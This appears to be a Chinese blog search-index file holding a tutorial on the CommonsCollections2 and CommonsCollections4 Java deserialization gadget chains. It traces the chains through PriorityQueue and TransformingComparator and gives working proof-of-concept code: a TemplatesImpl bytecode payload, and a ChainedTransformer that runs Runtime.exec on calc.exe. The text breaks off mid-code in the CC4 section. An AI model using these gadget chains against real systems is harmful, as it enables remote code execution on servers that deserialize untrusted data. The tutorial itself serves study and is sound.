<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CommonsCollections2和CommonsCollections4</title>
    <url>/2023/08/21/CommonsCollections2%E5%92%8CCommonsCollections4/</url>
    <content><![CDATA[<p>CommonsCollections2和CommonsCollections4具有一个共同的特征：使用commons-collections4而非commons-collections</p>
<h2 id="commons-collections4"><a href="#commons-collections4" class="headerlink" title="commons-collections4"></a>commons-collections4</h2><p>在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有两个分⽀版本：</p>
<ul>
<li>commons-collections:commons-collections</li>
<li>org.apache.commons:commons-collections4</li>
</ul>
<p>由于commons-collections存在一些Api和架构上的设计问题，若进行修复会存在向前兼容问题。因此官网推出commons-collections4。commons-collections4并非commons-collections的替代品，而是一个新的包，因此两者可共存在一个项目中。</p>
<h3 id="commons-collections4中的CC链"><a href="#commons-collections4中的CC链" class="headerlink" title="commons-collections4中的CC链"></a>commons-collections4中的CC链</h3><p>回忆前面学过的CC链，核心部分为commons-collections库中的各个Transformer类以及LazyMap类。在commons-collections4中这些类是否还适用？</p>
<p>这里使用CC6进行尝试，发现<code>LazyMap#decorate()</code>发生报错。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230821152242912.png"
                      alt="image-20230821152242912"
                ></p>
<p>在commons-collections中<code>LazyMap#decorate()</code>用来生成LazyMap实例化对象。查看commons-collections4中的LazyMap，发现<code>decorate()</code>方法被更改为<code>lazyMap()</code>。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230821155203271.png"
                      alt="image-20230821155203271"
                ></p>
<p>在源码中进行更改后，可以成功执行。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230821155420921.png"
                      alt="image-20230821155420921"
                ></p>
<p>除了LazyMap外，TransformedMap经过稍微更改也可以在commons-collections4中执行。</p>
<h2 id="CommonsCollections2链"><a href="#CommonsCollections2链" class="headerlink" title="CommonsCollections2链"></a>CommonsCollections2链</h2><p>查看ysoserial中CommonsCollections2的代码，可以发现引入了两个新的类：PriorityQueue、TransformingComparator</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Queue&lt;Object&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">		<span class="comment">// mock method name until armed</span></span><br><span class="line">		<span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">		<span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">		<span class="comment">// stub data for replacement later</span></span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// switch method called by comparator</span></span><br><span class="line">		Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// switch contents of queue</span></span><br><span class="line">		<span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">		queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">		queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> queue;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		PayloadRunner.run(CommonsCollections2.class, args);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PriorityQueue和TransformingComparator"><a href="#PriorityQueue和TransformingComparator" class="headerlink" title="PriorityQueue和TransformingComparator"></a>PriorityQueue和TransformingComparator</h3><blockquote>
<p>PriorityQueue是一个优先队列，优先队列每次出队时的元素都是优先级最高的元素。TransformingComparator是比较器，其用来对队列中的元素进行比较，并指定优先级</p>
</blockquote>
<p>由ysoserial可以看到PriorityQueue即最后进行序列化的类。</p>
<p>反序列化流程从<code>PriorityQueue#readObject()</code>开始</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>heapify()</code> ，查看ysoserial可以发现这里的<code>queue[0]</code>为templates</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>siftDown(int k, E x)</code>。这里的<code>comparator</code>为<code>TransformingComparator</code>，很显然不为null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>siftDownUsingComparator(int k, E x)</code>。这里执行了<code>comparator.compare(x, (E) c)</code>，参数x为templates。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看<code>TransformingComparator#compare()</code>。查看ysoserial可以发现这里的<code>this.transformer</code>为<code>InvokerTransformer</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在ysoserial中，通过反射将<code>InvokerTransformer#iMethodName</code>赋值为<code>newTransformer</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>因此反序列化时相当于执行了<code>InvokerTransformer.transform(templates)</code></p>
<p>根据ysoserial思路尝试自己构造POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造templates链</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsQ2xzLmphdmEMAA4ADwcAGwwAHAAdAQAMSGVsbG8gV29ybGQhBwAeDAAfACABABBUZW1wbGF0ZXNJbXBsQ2xzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAATAAQAFAAMABUAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_name&quot;</span>, templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_tfactory&quot;</span>, templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//实例化PriorityQueue类。后续会调用TransformingComparator#compare</span></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;toString&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer));</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;iMethodName&quot;</span>,invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230822112816591.png"
                      alt="image-20230822112816591"
                ></p>
<p>除了使用TemplatesImpl外，当然也可以使用ChainedTransformer。</p>
<p>这里的<code>priorityQueue.add()</code>和使用TemplatesImpl不同，调试一下代码即可了解原因。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] faketransformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line">        <span class="comment">//实例化PriorityQueue类。后续会调用TransformingComparator#compare</span></span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer));</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;iTransformers&quot;</span>,chainedTransformer,transformers);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CommonsCollections4链"><a href="#CommonsCollections4链" class="headerlink" title="CommonsCollections4链"></a>CommonsCollections4链</h2><p>同样从ysoserial代码入手</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">		<span class="type">ConstantTransformer</span> <span class="variable">constant</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// mock method name until armed</span></span><br><span class="line">		Class[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;;</span><br><span class="line">		Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line">		<span class="type">InstantiateTransformer</span> <span class="variable">instantiate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">				paramTypes, args);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// grab defensively copied arrays</span></span><br><span class="line">		paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">		args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// create queue with numbers</span></span><br><span class="line">		PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain));</span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// swap in values to arm</span></span><br><span class="line">		Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">		paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">		args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> queue;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>看一下代码中用到的类。很明显CC4是CC2和CC3的结合。</p>
<p>回忆CC3，核心代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;	</span><br></pre></td></tr></table></figure>

<p>根据ysoserial中的思路，我们可以构造如下代码：</p>
<p>比较简单，就不逐行分析了。最后在<code>TransformingComparator#compare()</code>中执行了<code>ChainedTransformer#transform()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span 